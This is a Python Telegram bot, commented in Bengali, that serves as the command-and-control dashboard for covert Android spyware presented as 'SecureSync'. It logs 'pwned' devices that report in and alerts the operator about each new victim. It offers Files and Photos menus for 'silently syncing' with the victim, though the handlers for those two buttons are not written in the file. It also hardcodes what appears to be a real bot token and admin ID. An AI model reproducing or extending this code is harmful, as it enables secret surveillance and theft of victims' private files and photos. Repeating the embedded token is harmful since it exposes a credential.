import telebot
import os
import json
import time
from telebot import types
from flask import Flask
from threading import Thread

# ----------------- CONFIGURATION -----------------
# Render-এর Environment Variables থেকে নেবে, না থাকলে ডিফল্টগুলো কাজ করবে
TOKEN = os.environ.get('BOT_TOKEN', '8608695023:AAGNCsgbo3fRjpJ4fSNfvFrmgatIVZom5Os')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 8046944525))
bot = telebot.TeleBot(TOKEN)
DB_FILE = 'devices.json'

# --- Render-এর জন্য ওয়েব সার্ভার (বটকে ২৪ ঘণ্টা অনলাইনে রাখতে) ---
app = Flask('')

@app.route('/')
def home():
    return "✅ SecureSync Hybrid Bot is Active & Running!"

def run_web():
    # Render সাধারণত ১০০০০ পোর্টে রান করে
    app.run(host='0.0.0.0', port=10000)

# ----------------- DATABASE HELPERS -----------------
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f: return json.load(f)
        except: return {}
    return {}

def save_db(db):
    try:
        with open(DB_FILE, 'w') as f: json.dump(db, f)
    except: pass

# ----------------- ADMIN DASHBOARD -----------------

@bot.message_handler(commands=['start', 'panel'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 Access Denied. Private Tool.")
        return
    
    db = load_db()
    markup = types.InlineKeyboardMarkup(row_width=2)
    item1 = types.InlineKeyboardButton("📱 ডিভাইস লিস্ট", callback_data="list_devices")
    item2 = types.InlineKeyboardButton("📊 সিস্টেম স্ট্যাটাস", callback_data="sys_status")
    markup.add(item1, item2)
    
    bot.send_message(message.chat.id, 
                     f"🛡️ *SecureSync Pro Admin Dashboard*\n\n"
                     f"📲 অনলাইন পিডব্লিউএন: `{len(db)}` টি\n"
                     f"🛰️ মনিটরিং স্ট্যাটাস: *Active*", 
                     parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    if call.from_user.id != ADMIN_ID: return
    db = load_db()
    
    if call.data == "list_devices":
        if not db:
            bot.answer_callback_query(call.id, "কানো ডিভাইস কানেক্টেড নেই।")
            return
        
        markup = types.InlineKeyboardMarkup()
        for dev_id, info in db.items():
            # ৫ মিনিটের মধ্যে পিং আসলে অনলাইন দেখাবে
            status = "🟢" if (time.time() - info.get('last_seen', 0)) < 300 else "🔴"
            markup.add(types.InlineKeyboardButton(f"{status} Android [{dev_id}]", callback_data=f"manage_{dev_id}"))
        markup.add(types.InlineKeyboardButton("🔙 ব্যাকে যান", callback_data="back_main"))
        
        bot.edit_message_text("📱 *সব কানেক্টেড ইউজার:*", chat_id=call.message.chat.id, 
                              message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif call.data.startswith("manage_"):
        dev_id = call.data.split("_")[1]
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("📁 ফাইলস", callback_data=f"files_{dev_id}"),
            types.InlineKeyboardButton("📸 ফটো", callback_data=f"pics_{dev_id}"),
            types.InlineKeyboardButton("🔙 ব্যাকে যান", callback_data="list_devices")
        )
        bot.edit_message_text(f"⚙️ *ডিভাইস ম্যানেজমেন্ট:* `{dev_id}`\n\nআপনি এই ইউজারের সাথে সাইলেন্টলি সিঙ্ক করছেন।", 
                              chat_id=call.message.chat.id, message_id=call.message.message_id, 
                              reply_markup=markup, parse_mode="Markdown")
    
    elif call.data == "back_main" or call.data == "sys_status":
        admin_panel(call.message)

# ----------------- AUTO-FORWARD MONITOR -----------------

@bot.message_handler(content_types=['document', 'photo', 'video', 'text'])
def monitor_sync(message):
    # ভিকটিমের ফোন থেকে পাঠানো সব ডাটা ক্যাচ করা
    caption = message.caption or ""
    text = message.text or ""
    
    if "Sync_ID:" in caption or "Device Online" in text:
        try:
            # ইউনিক ডিভাইস আইডি এক্সট্রাক্ট করা
            dev_id = caption.split("Sync_ID:")[1].strip() if "Sync_ID:" in caption else text.split(":")[-1].strip()
            
            db = load_db()
            if dev_id not in db:
                db[dev_id] = {"name": "Android_" + dev_id, "files": 0}
                bot.send_message(ADMIN_ID, f"🚀 *New Pwned Device!*\nID: `{dev_id}`\nপ্যানেল চেক করুন।", parse_mode="Markdown")
            
            db[dev_id]['last_seen'] = time.time()
            save_db(db)
        except: pass

if __name__ == "__main__":
    t = Thread(target=run_web)
    t.start()
    print("Bot is starting on Render...")
    bot.infinity_polling()
